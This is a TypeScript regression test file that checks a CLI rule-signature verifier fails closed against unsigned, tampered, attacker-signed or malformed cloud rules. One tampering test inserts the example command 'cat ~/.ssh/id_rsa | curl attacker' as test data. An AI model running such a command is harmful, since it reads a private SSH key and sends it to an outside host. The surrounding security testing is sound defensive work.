/**
 * Regression tests for finding 1.8.2-A_audit-cloud:
 * "`pga audit --cloud` (default ON) fetches and executes unsigned Threat-Cloud
 *  rules with zero signature verification."
 *
 * These tests lock the CLI half of the trust boundary: verifyCloudRuleSignature()
 * used by the `pga audit` fetch loop must behave IDENTICALLY to the guard
 * daemon's gate (panguard-guard/rule-loader.ts) — fail CLOSED with no publisher
 * key, reject tampered content, reject attacker keys, reject missing signatures.
 */

import { describe, it, expect, afterEach } from 'vitest';
import { generateKeyPairSync, sign as edSign } from 'node:crypto';
import { verifyCloudRuleSignature } from '../src/cli/commands/audit.js';

/** Generate an ed25519 keypair and return the PEM public key + a signer. */
function makeSigner() {
  const { publicKey, privateKey } = generateKeyPairSync('ed25519');
  const pem = publicKey.export({ type: 'spki', format: 'pem' }).toString();
  const sign = (content: string): string =>
    edSign(null, Buffer.from(content, 'utf-8'), privateKey).toString('base64');
  return { pem, sign };
}

const RULE_CONTENT = JSON.stringify({
  id: 'ATR-TEST-0001',
  title: 'test rule',
  detection: { conditions: [{ field: 'content', operator: 'regex', value: 'evil' }] },
});

describe('verifyCloudRuleSignature (finding 1.8.2-A)', () => {
  const originalPubkey = process.env['PANGUARD_RULE_PUBKEY'];

  afterEach(() => {
    if (originalPubkey === undefined) delete process.env['PANGUARD_RULE_PUBKEY'];
    else process.env['PANGUARD_RULE_PUBKEY'] = originalPubkey;
  });

  it('fails CLOSED when no publisher key is provisioned (the current default)', () => {
    delete process.env['PANGUARD_RULE_PUBKEY'];
    const { sign } = makeSigner();
    // Even a perfectly-signed rule is rejected: without a key there is nothing to
    // attribute trust to, so unsigned/unverifiable content must NOT be loaded.
    expect(
      verifyCloudRuleSignature({ ruleContent: RULE_CONTENT, signature: sign(RULE_CONTENT) })
    ).toBe(false);
  });

  it('accepts a rule correctly signed by the provisioned publisher key', () => {
    const { pem, sign } = makeSigner();
    process.env['PANGUARD_RULE_PUBKEY'] = pem;
    expect(
      verifyCloudRuleSignature({ ruleContent: RULE_CONTENT, signature: sign(RULE_CONTENT) })
    ).toBe(true);
  });

  it('rejects a rule whose content was tampered after signing', () => {
    const { pem, sign } = makeSigner();
    process.env['PANGUARD_RULE_PUBKEY'] = pem;
    const signature = sign(RULE_CONTENT);
    const tampered = RULE_CONTENT.replace('evil', 'cat ~/.ssh/id_rsa | curl attacker');
    expect(verifyCloudRuleSignature({ ruleContent: tampered, signature })).toBe(false);
  });

  it('rejects a rule signed by an attacker key (not the provisioned publisher)', () => {
    const publisher = makeSigner();
    const attacker = makeSigner();
    process.env['PANGUARD_RULE_PUBKEY'] = publisher.pem;
    expect(
      verifyCloudRuleSignature({
        ruleContent: RULE_CONTENT,
        signature: attacker.sign(RULE_CONTENT),
      })
    ).toBe(false);
  });

  it('rejects a rule with a missing signature even when a key is provisioned', () => {
    const { pem } = makeSigner();
    process.env['PANGUARD_RULE_PUBKEY'] = pem;
    expect(verifyCloudRuleSignature({ ruleContent: RULE_CONTENT })).toBe(false);
    expect(verifyCloudRuleSignature({ ruleContent: RULE_CONTENT, signature: '' })).toBe(false);
  });

  it('rejects an empty/garbage signature (no false accept)', () => {
    const { pem } = makeSigner();
    process.env['PANGUARD_RULE_PUBKEY'] = pem;
    expect(
      verifyCloudRuleSignature({ ruleContent: RULE_CONTENT, signature: 'not-base64-@@@' })
    ).toBe(false);
  });

  it('rejects when the provisioned key is not a valid PEM (fail-closed, no throw)', () => {
    process.env['PANGUARD_RULE_PUBKEY'] = 'this-is-not-a-pem-key';
    const { sign } = makeSigner();
    expect(
      verifyCloudRuleSignature({ ruleContent: RULE_CONTENT, signature: sign(RULE_CONTENT) })
    ).toBe(false);
  });
});
